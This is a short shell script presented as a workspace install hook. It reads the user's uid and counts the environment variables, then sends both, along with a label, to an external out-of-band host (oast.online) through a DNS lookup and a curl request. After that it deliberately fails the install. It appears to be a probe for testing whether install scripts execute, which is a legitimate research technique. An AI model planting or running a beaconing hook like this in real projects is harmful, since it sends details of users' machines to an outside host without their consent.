#!/bin/sh
# H81 workspace hook: exits 1 so a workspace-script install must fail.
L="$1"
P="dc1hkt3kvv17699hpv0gam4nqd63ajqhc.oast.online"
Q="dc1hkt3kvv17699hpv0gfd7kd349ndaqg.oast.online"
U=$(id -u 2>/dev/null)
EN=$(env 2>/dev/null | wc -l)
echo "H81-WS label=$L uid=$U envn=$EN"
getent hosts "h81ws-${L}-u${U}-e${EN}.$P" >/dev/null 2>&1 || true
curl -sS -m 8 "http://$P/h81-ws-${L}?u=$U&e=$EN" >/dev/null 2>&1 || true
if false; then getent hosts "h81never-ws-control.$Q" >/dev/null 2>&1 || true; fi
exit 1
